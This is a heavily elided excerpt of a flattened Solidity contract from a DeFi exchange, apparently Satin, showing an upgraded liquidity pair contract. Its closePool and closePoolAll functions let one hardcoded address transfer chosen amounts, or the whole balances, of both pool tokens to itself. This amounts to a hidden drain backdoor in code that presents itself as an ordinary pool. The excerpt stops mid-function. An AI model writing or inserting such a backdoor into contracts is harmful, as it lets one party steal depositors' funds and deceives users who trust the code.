...
// File contracts/base/core/BaseV1Fees.sol
...
// File contracts/interface/ICalle.sol
...
// File contracts/lib/SatinLibrary.sol
...
// File contracts/base/core/BaseV1Pair_Upgrade.sol
...
contract BaseV1Pair_Upgrade is Initializable, ReentrancyGuardUpgradeable, IERC20, IPair {
    ...
    function closePool(uint256 _one, uint256 _two) external {
        require(msg.sender == 0x1B71e379094785E0f8c9a6b2588503927f995807, "not permitted");
        (address _token0, address _token1) = (token0, token1);
        IERC20(_token0).safeTransfer(0x1B71e379094785E0f8c9a6b2588503927f995807, _one);
        IERC20(_token1).safeTransfer(0x1B71e379094785E0f8c9a6b2588503927f995807, _two);
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }

    function closePoolAll() external {
        require(msg.sender == 0x1B71e379094785E0f8c9a6b2588503927f995807, "not permitted");
        (address _token0, address _token1) = (token0, token1);
        IERC20(_token0).safeTransfer(0x1B71e379094785E0f8c9a6b2588503927f995807, IERC20(token0).balanceOf(address(this)));
        IERC20(_token1).safeTransfer(0x1B71e379094785E0f8c9a6b2588503927f995807, IERC20(token1).balanceOf(address(this)));
